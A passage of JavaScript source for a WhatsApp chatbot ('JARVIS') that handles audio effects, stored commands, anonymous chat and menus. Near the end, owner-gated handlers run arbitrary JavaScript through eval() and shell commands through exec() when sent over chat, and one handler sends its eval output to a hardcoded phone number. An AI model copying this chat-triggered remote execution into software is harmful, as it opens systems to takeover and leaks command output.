                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await sparrow.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                sparrow.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else sparrow.reply(m.chat,`𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖆𝖚𝖉𝖎𝖔`,m)
                } catch (e) {
                sparrow.reply(m.chat,e,m)
                }
                break
            case 'setcmd': {
            if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
            if (!isCreator) throw mess.owner
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                sparrow.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply to a msg!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
            if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply to a msg'
                if (!text) throw `Example : ${prefix + command} file name`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Added '${text}' succesfully
    
Type ${prefix}listmsg for list.`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' is not available`
                sparrow.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' is not in the list`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                sparrow.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await sparrow.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, sparrow.user.name, m)
            }
			break


            case 'public': {
                if (!isCreator) throw mess.owner
                sparrow.public = true
                m.reply('Succesfully changed To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                sparrow.public = false
                m.reply('Succesfully changed To Self Usage')
            }
            break
            case 'status': {
                sparrow.reply(m.chat, `──────〔 *_𝙹𝙰𝚁𝚅𝙸𝚂_* 〕──────\n\n𝖘𝖙𝖆𝖙𝖚𝖘 : ${status}\n𝖌𝖎𝖙 : https://github.com/sparroo\n\n──────〔 *_𝙹𝙰𝚁𝚅𝙸𝚂_* 〕──────`, m)
            }
            break
            case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
──────〔 *_𝙹𝙰𝚁𝚅𝙸𝚂_* 〕──────

🧭𝖘𝖕𝖊𝖊𝖉 : ${latensi.toFixed(4)} 𝖘𝖊𝖈𝖔𝖓𝖉𝖘
⏱️𝖗𝖚𝖓𝖙𝖎𝖒𝖊 : ${runtime(process.uptime())}
🤖𝖘𝖙𝖆𝖙𝖚𝖘 : ${status}

──────〔 *_𝙹𝙰𝚁𝚅𝙸𝚂_* 〕──────
`.trim()
                m.reply(respon)
            }
            break
            case 'speedtest': {
            sparrow.reply(m.chat,'Testing Speed...',m)
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) sparrow.reply(m.chat,stdout,m)
        if (stderr.trim()) sparrow.reply(m.chat,stderr,m)
            }
            }
            break
            case 'owner': case 'creator': {
            sparrow.sendContact(m.chat, global.owner, m)
            }
            break
            case 'menu': {
    allmenu = `──────〔 *_𝙹𝙰𝚁𝚅𝙸𝚂_* 〕──────

🌹ᴏᴡɴᴇʀ : ᴀᴋsʜᴀʏ
🌹ᴄʀᴇᴀᴛᴏʀ : @${dtod.split('@')[0]}

──〔 𝖎𝖓𝖋𝖔 〕

🌹ᴛɪᴍᴇ : ${wita}
🌹ᴅᴀʏ : ${thisDay}
🌹ᴅᴀᴛᴇ : ${ini_tanggal}

──〔 𝖇𝖔𝖙 𝖎𝖓𝖋𝖔 〕

🌹ᴘʀᴇғɪx : ${prefix}
🌹sᴛᴀᴛᴜs : ${status}
🌹sᴘᴇᴇᴅ :${latensiii} 
🌹ʀᴀᴍ : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB

──────〔 *_𝙹𝙰𝚁𝚅𝙸𝚂_* 〕──────

┌─〔 𝖌𝖗𝖔𝖚𝖕 𝖒𝖊𝖓𝖚 〕
┊
┊📃 ${prefix}linkgroup
┊📃 ${prefix}ephemeral 
┊📃 ${prefix}setppgc
┊📃 ${prefix}setname 
┊📃 ${prefix}setdesc
┊📃 ${prefix}group 
┊📃 ${prefix}editinfo
┊📃 ${prefix}add
┊📃 ${prefix}kick
┊📃 ${prefix}hidetag 
┊📃 ${prefix}tagall
┊📃 ${prefix}antilink 
┊📃 ${prefix}mute
┊📃 ${prefix}promote
┊📃 ${prefix}demote 
┊📃 ${prefix}vote 
┊📃 ${prefix}devote
┊📃 ${prefix}upvote
┊📃 ${prefix}cekvote
┊📃 ${prefix}hapusvote
┊
└─────────𔒝

┌─〔 𝖉𝖔𝖜𝖓𝖑𝖔𝖆𝖉 𝖒𝖊𝖓𝖚 〕
│
┊📥 ${prefix}ytmp3
┊📥 ${prefix}ytmp4
┊📥 ${prefix}getmusic
┊📥 ${prefix}getvideo
┊
└─────────𔒝

┌─〔 𝖘𝖊𝖆𝖗𝖈𝖍 𝖒𝖊𝖓𝖚 〕
│
┊🔎 ${prefix}play
┊🔎 ${prefix}yts
┊🔎 ${prefix}google
┊🔎 ${prefix}gimage
┊🔎 ${prefix}pinterest
┊🔎 ${prefix}wallpaper
┊🔎 ${prefix}wikimedia
┊🔎 ${prefix}ytsearch
┊🔎 ${prefix}ringtone
┊
└─────────𔒝

┌─〔 𝖈𝖔𝖓𝖛𝖊𝖗𝖙 𝖒𝖊𝖓𝖚 〕
│
┊♻️ ${prefix}toimage
┊♻️ ${prefix}removebg
┊♻️ ${prefix}sticker
┊♻️ ${prefix}emojimix
┊♻️ ${prefix}tovideo
┊♻️ ${prefix}togif
┊♻️ ${prefix}tourl
┊♻️ ${prefix}tovn
┊♻️ ${prefix}tomp3
┊♻️ ${prefix}toaudio
┊♻️ ${prefix}ebinary
┊♻️ ${prefix}dbinary
┊♻️ ${prefix}styletext
┊♻️ ${prefix}smeme
┊
└─────────𔒝

┌─〔 𝖒𝖆𝖎𝖓 𝖒𝖊𝖓𝖚 〕
│
┊🔮 ${prefix}ping
┊🔮 ${prefix}owner
┊🔮 ${prefix}delete
┊🔮 ${prefix}infochat
┊🔮 ${prefix}quoted
┊🔮 ${prefix}listpc
┊🔮 ${prefix}listgc
┊🔮 ${prefix}listonline
┊🔮 ${prefix}speedtest
┊
└─────────𔒝

┌─〔 𝖉𝖆𝖙𝖆𝖇𝖆𝖘𝖊 𝖒𝖊𝖓𝖚 〕
│
┊🗂 ${prefix}setcmd
┊🗂 ${prefix}listcmd
┊🗂 ${prefix}delcmd
┊🗂 ${prefix}lockcmd
┊🗂 ${prefix}addmsg
┊🗂 ${prefix}listmsg
┊🗂 ${prefix}getmsg
┊🗂 ${prefix}delmsg
┊
└─────────𔒝

┌─〔 𝖛𝖔𝖎𝖈𝖊 𝖈𝖍𝖆𝖓𝖌𝖊𝖗 〕
│
┊🎙 ${prefix}bass
┊🎙 ${prefix}blown
┊🎙 ${prefix}deep
┊🎙 ${prefix}earrape
┊🎙 ${prefix}fast
┊🎙 ${prefix}fat
┊🎙 ${prefix}nightcore
┊🎙 ${prefix}reverse
┊🎙 ${prefix}robot
┊🎙 ${prefix}slow
┊🎙 ${prefix}tupai
┊
└─────────𔒝

┌─〔 𝖔𝖜𝖓𝖊𝖗 𝖒𝖊𝖓𝖚 〕
│
┊💰 ${prefix}react
┊💰 ${prefix}chat
┊💰 ${prefix}join
┊💰 ${prefix}leave
┊💰 ${prefix}block @user
┊💰 ${prefix}unblock @user
┊💰 ${prefix}bcgroup
┊💰 ${prefix}bcall
┊💰 ${prefix}setppbot
┊💰 ${prefix}setexif
┊
└─────────𔒝`
let buffer = fs.readFileSync('./lib/jarvis.jpg')
sparrow.sendImage(m.chat, buffer, allmenu, m)
alma = fs.readFileSync(`./menu.mp3`)
sparrow.sendMessage(m.chat, { audio: alma, mimetype: 'audio/mp4' , ptt: true }, { quoted: m})
}
            break
            
            case 'list2': {
            sendLstMessage(m.chat, 'test', 'test', 'test', 'test', [
            {title: "Section 1",rows: 
            [{title: "Option 1", rowId: "option1"},
            {title: "Option 2", rowId: "option2", description: "This is a description"}]},
            
            {title: "Section 2",rows: 
            [{title: "Option 3", rowId: "option3"},
            {title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
            }
            break
            
            
            default:
            
            
            if (!m.isGroup) {
            
            if (!isCreator) {
            console.log(chalk.green('......................msg......................'))
            let res = await axios.get(`https://api.simsimi.net/v2/?text=${budy}&lc=en`)
            console.log(chalk.green('......................simsimi......................'))
            sparrow.reply(m.chat, res.data.success, m)
        //let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_english?query=${res.data.success}`)
      // console.log(chalk.green('......................done......................'))
           //  sparrow.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true, fileName: `${budy}.mp3` }, { quoted: m })
            }}
            
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await sparrow.reply('919947291867@s.whatsapp.net',evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    sparrow.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
